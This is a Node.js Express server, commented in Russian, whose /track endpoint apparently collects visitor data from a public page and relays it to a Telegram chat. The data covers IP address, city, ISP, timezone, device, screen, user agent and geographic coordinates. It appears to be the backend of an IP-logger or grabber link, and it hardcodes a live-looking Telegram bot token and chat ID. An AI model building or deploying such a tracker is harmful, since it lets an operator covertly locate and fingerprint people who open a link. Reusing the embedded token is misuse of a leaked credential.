const express = require('express');
const axios = require('axios');
const bodyParser = require('body-parser');
const path = require('path');
const app = express();

const PORT = process.env.PORT || 8080;
const TELEGRAM_TOKEN = '8045162630:AAEritxdtynKLUG2mr-C0TMIyc0UcDnlKNY';
const CHAT_ID = '1031226674';

app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));

app.post('/track', async (req, res) => {
  try {
    const d = req.body;

    const message = `
🥔 <b>Новый переход</b>
🌍 <b>IP:</b> ${d.ip}
📍 <b>Город:</b> ${d.city}, ${d.country} (${d.region})
🛰 <b>Провайдер:</b> ${d.org}
🕓 <b>Часовой пояс:</b> ${d.timezone} (offset: ${d.timezoneOffset})
📱 <b>Устройство:</b> ${d.device}, сенсор: ${d.touchSupport ? 'Да' : 'Нет'}
🖥 <b>Экран:</b> ${d.screen}, язык: ${d.language}
🧠 <b>User-Agent:</b> ${d.userAgent}
📍 <b>Координаты:</b> ${d.loc}
`;

    await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: message,
      parse_mode: 'HTML'
    });

    res.status(200).end();
  } catch (err) {
    console.error('Ошибка:', err.message);
    res.status(500).end();
  }
});

app.listen(PORT, () => {
  console.log(`✅ Сервер запущен на http://localhost:${PORT}`);
});
